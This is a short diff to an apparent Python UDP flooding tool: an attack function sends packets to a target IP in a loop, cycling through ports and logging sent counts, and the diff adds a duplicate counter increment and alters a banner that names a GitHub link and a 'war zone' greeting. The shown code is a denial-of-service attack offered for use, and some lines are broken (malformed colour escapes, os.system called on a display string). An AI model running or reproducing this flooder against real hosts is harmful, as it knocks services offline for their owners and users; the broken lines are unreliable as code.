@@ -120,6 +120,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
             sock.sendto(data, (ip, port))
             sent += 1
             log_message(f"\033[100m \033[34mTermul-Katrok \033[0m \033[31m- {threading.get_ident()} \033[103m \033[97mSent{sent} \033[0m  \033[33m{ip}:{port}")
+            sent += 1
             log_message(f"\033[101m \38;5;206m033[97mTermul-Katrok \033[0m \033[94m- {threading.get_ident()} \033[100m \033[31mSent{sent} \033[0m  \033[33m{ip}:{port}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
@@ -131,8 +132,8 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         sock.close()
 
 os.system("clear")
-os.system("\033[100m \033[33mhttps://github.com/ahmadsan272-ship-it/TasbihCinta \033[0m")
-print("\033[33m.  Welcome to zona PERANG LAEAN ZI0N15 \033[0m")
+os.system("\033[97m \033[33mhttps://github.com/ahmadsan272-ship-it/0slo \033[0m")
+print("\033[33m  Welcome to zona PERANG LAEAN ZI0N15 \033[0m")
 time.sleep(5)
 print("Loading.......")
 
